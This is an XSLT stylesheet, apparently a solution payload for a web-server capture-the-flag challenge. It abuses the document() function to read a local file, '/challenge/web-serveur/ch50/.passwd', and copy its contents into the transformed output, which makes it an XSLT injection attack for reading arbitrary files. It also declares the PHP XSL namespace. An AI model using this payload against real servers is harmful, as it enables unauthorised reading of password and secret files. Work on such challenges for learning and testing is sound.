<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
    <xsl:template match="/">
        <xsl:copy-of select="document('file:///challenge/web-serveur/ch50/.passwd')"/>
    </xsl:template>
</xsl:stylesheet>
